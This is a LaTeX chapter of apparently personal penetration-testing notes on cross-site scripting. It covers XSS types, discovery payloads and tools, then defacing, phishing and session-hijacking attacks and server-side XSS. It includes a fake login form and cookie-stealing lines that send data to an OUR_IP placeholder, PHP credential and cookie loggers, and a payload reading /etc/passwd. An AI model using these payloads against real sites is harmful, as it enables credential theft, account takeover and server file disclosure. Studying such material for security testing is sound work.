\chapter{Cross-Site Scripting (XSS)}

\section{Introduction}
XSS vulnerabilities take advantage of a flaw in user input sanitization to
"write" JavaScript code to the page and execute it on the client side, leading
to several types of attacks.

XSS vulnerabilities are solely executed on the client-side and hence do not
directly affect the back-end server.

They can only affect the user executing the vulnerability. The direct impact of
XSS vulnerabilities on the back-end server may be relatively low, but they are
very commonly found in web applications, so this equates to a medium risk 

A basic example of an XSS attack is having the target user unwillingly send
their session cookie to the attacker's web server.

As XSS attacks execute JavaScript code within the browser, they are limited to
the browser's JS engine (i.e., V8 in Chrome). They cannot execute system-wide
JavaScript code to do something like system-level code execution. In modern
browsers, they are also limited to the same domain of the vulnerable website. 

In addition to this, if a skilled researcher identifies a binary vulnerability
in a web browser (e.g., a Heap overflow in Chrome), they can utilize an XSS
vulnerability to execute a JavaScript exploit on the target's browser, which
eventually breaks out of the browser's sandbox and executes code on the user's
machine.

\subsection{XSS types}

There are three main types of XSS vulnerabilities:
\begin{itemize}
    \item {\bf Stored (Persistent) XSS}: ithe most critical type of XSS, which
        occurs when user input is stored on the back-end database and then
        displayed upon retrieval (e.g., posts or comments)
    \item {\bf Reflected (Non-Persistent) XSS} occurs when user input is
        displayed on the page after being processed by the backend server, but
        without being stored (e.g., search result or error message)
    \item {\bf DOM-based XSS} another Non-Persistent XSS type that occurs when
        user input is directly shown in the browser and is completely processed
        on the client-side, without reaching the back-end server (e.g., through
        client-side HTTP parameters or anchor tags)
\end{itemize}





\subsection{Basic discovery payload}

\begin{verbatim}
<script>alert(window.origin)</script>
\end{verbatim}

Tip: Many modern web applications utilize cross-domain IFrames to handle user
input, so that even if the web form is vulnerable to XSS, it would not be a
vulnerability on the main web application. This is why we are showing the value
of window.origin in the alert box, instead of a static value like 1. In this
case, the alert box would reveal the URL it is being executed on, and will
confirm which form is the vulnerable one, in case an IFrame was being used.

As some modern browsers may block the \verb+alert()+ JavaScript function in
specific locations, it may be handy to know a few other basic XSS payloads to
verify the existence of XSS. One such XSS payload is \verb+<plaintext>+, which
will stop rendering the HTML code that comes after it and display it as
plaintext.  Another easy-to-spot payload is \verb+<script>print()</script>+
that will pop up the browser print dialog, which is unlikely to be blocked by
any browsers.

Another usefull one is the \verb+console.log+ or simply \verb+debuger+
\begin{verbatim}
<script>debugger;</script>
\end{verbatim}

\begin{small}
\begin{verbatim}
<script>console.log("Test XSS\n".concat(document.domain).concat("\n").concat(window.origin))</script>
\end{verbatim}
\end{small}

\section{XSS basics}

\input{web/xss/stored}
\input{web/xss/reflected}
\input{web/xss/dom}

\subsection{Automated discovery}
Almost all Web Application Vulnerability Scanners (like Nessus, Burp Pro, or
ZAP) have various capabilities for detecting all three types of XSS
vulnerabilities. These scanners usually do two types of scanning:
\begin{itemize}
    \item A Passive Scan, which reviews client-side code for potential DOM-based vulnerabilities,
    \item An Active Scan, which sends various types of payloads to attempt to
        trigger an XSS through payload injection in the page source.
\end{itemize}

open-source tools can assist us in identifying potential XSS vulnerabilities.
Such tools usually work by identifying input fields in web pages, sending
various types of XSS payloads, and then comparing the rendered page source to
see if the same payload can be found in it, which may indicate a successful XSS
injection. Still, this will not always be accurate, as sometimes, even if the
same payload was injected, it might not lead to a successful execution due to
various reasons, so we must always manually verify the XSS injection.

Some of the common open-source tools that can assist us in XSS discovery are
\href{https://github.com/s0md3v/XSStrike}{XSS Strike},
\href{https://github.com/rajeshmajumdar/BruteXSS}{Brute XSS}, and
\href{https://github.com/epsylon/xsser}{XSSer}. 


\subsection{Manual discovery}

\subsubsection{XSS payloads}

\href{https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md}{PayloadAllTheThing}
    and \href{https://github.com/payloadbox/xss-payload-list}{PayloadBox}
    provides a good amount of payloads.

The majority of the payloads proposed do not work even though we are dealing
with the most basic type of XSS vulnerabilities. This is because these payloads
are written for a wide variety of injection points (like injecting after a
single quote) or are designed to evade certain security measures (like
sanitization filters). Furthermore, such payloads utilize a variety of
injection vectors to execute JavaScript code, like basic <script> tags, other
HTML Attributes like <img>, or even CSS Style attributes. This is why we can
expect that many of these payloads will not work in all test cases, as they are
designed to work with certain types of injections.

\href{https://github.com/LasCC/Hack-Tools}{Hack-Tools}

\subsubsection{Code review}
The most reliable method of detecting XSS vulnerabilities is manual code
review, which should cover both back-end and front-end code. Understand
precisely how the input is being handled all the way until it reaches the web
browser, allow to write a custom payload that should work with high confidence.

It's unlikely to find any XSS vulnerabilities through payload lists or XSS
tools for the more common web applications. This is because the developers of
such web applications likely run their application through vulnerability
assessment tools and then patch any identified vulnerabilities before release.
For such cases, manual code review may reveal undetected XSS vulnerabilities,
which may survive public releases of common web applications.

\section{XSS attacks}

\subsection{Defacing}
One of the most common attacks usually used with stored XSS vulnerabilities is
website defacing attacks. Defacing a website means changing its look for anyone
who visits the website. It is very common for hacker groups to deface a website
to claim that they had successfully hacked it. Such attacks can carry great
media echo and may significantly affect a company's investments and share
prices, especially for banks and technology firms.

Although many other vulnerabilities may be utilized to achieve the same thing,
stored XSS vulnerabilities are among the most used vulnerabilities for doing
so.

We can utilize injected JavaScript code (through XSS) to make a web page look
any way we like. However, defacing a website is usually used to send a simple
message (i.e., we successfully hacked you), so giving the defaced web page a
beautiful look isn't really the primary target.

Three HTML elements are usually utilized to change the main look of a web page:
\begin{itemize}
        \item Background Color \verb+document.body.style.background+
        \item Background \verb+document.body.background+
        \item Page \verb+Title document.title+
        \item Page Text \verb+DOM.innerHTML+ that should be {\bf minifyed}
\end{itemize}

We can utilize two or three of these elements to write a basic message to the
web page and even remove the vulnerable element
\verb+document.getElementById().remove()+ such that it would be more difficult
to quickly reset the web page, as we will see next.

To find the id of the HTML element to remove, one can use the {\emph Page
Inspector Picker}

Another solution more violant is to comment all the HTML after the payload 

\subsection{Phishing}
Phishing attacks usually utilize legitimate-looking information to trick the
victims into sending their sensitive information to the attacker. A common form
of XSS phishing attacks is through injecting fake login forms that send the
login details to the attacker's server, which may then be used to log in on
behalf of the victim and gain control over their account and sensitive
information.

One common vector can be a form of image viewers (type an image url to be
displayed).

The attack will consist of creating a payload that will deface the webpage and
insert a login form. The form action will send the data to a webserver owned by
the attacker.

example of payload:
\begin{verbatim}
<script>document.write('
    <h3>Please login to continue</h3>
    <form action=http://OUR_IP/index.php>
        <input type="username" name="username" placeholder="Username">
        <input type="password" name="password" placeholder="Password">
        <input type="submit" name="submit" value="Login">
    </form>');
    document.getElementById('urlform').remove();
\end{verbatim}

For the attacker server a simple nc will work but for persistance a php server
with the following code can be started:
\begin{verbatim}
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
\end{verbatim}


\subsection{Session hijacking}
There are multiple JavaScript payloads we can use to grab the session cookie
and send it to us, as shown by
\href{https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#exploit-code-or-poc}{PayloadsAllTheThings}:
\begin{verbatim}
document.location='http://OUR_IP/index.php?c='+document.cookie;
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
\end{verbatim}


runing on our webserver
\begin{verbatim}
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | $key : {$cookie}\n");
        fclose($file);
    }
}
?>
\end{verbatim}


\section{Server Side XSS}

in cas a server is building a pdf an a field is reflected in the pdf it might
be vulnerable. See
\href{https://blog.appsecco.com/finding-ssrf-via-html-injection-inside-a-pdf-file-on-aws-ec2-214cc5ec5d90}{this}
and
\href{https://namratha-gm.medium.com/ssrf-to-local-file-read-through-html-injection-in-pdf-file-53711847cb2f}{this
articles}

To test:
\begin{verbatim}
<script>document.write('PWNED')</script>
\end{verbatim}

real paylod:
\begin{verbatim}
<iframe src=”http://hacker.com"></iframe>

<p id=”test”>aa</p><script>document.getElementById(‘test’).innerHTML+=’aa’</script>


<p id=”test”>aa</p><script>document.getElementById(‘test’).innerHTML+=window.location</script>

<script>
	x=new XMLHttpRequest;
	x.onload=function(){  
	document.write(this.responseText)};
	x.open("GET","file:///etc/passwd");
	x.send();
</script>
\end{verbatim}



\section{links}
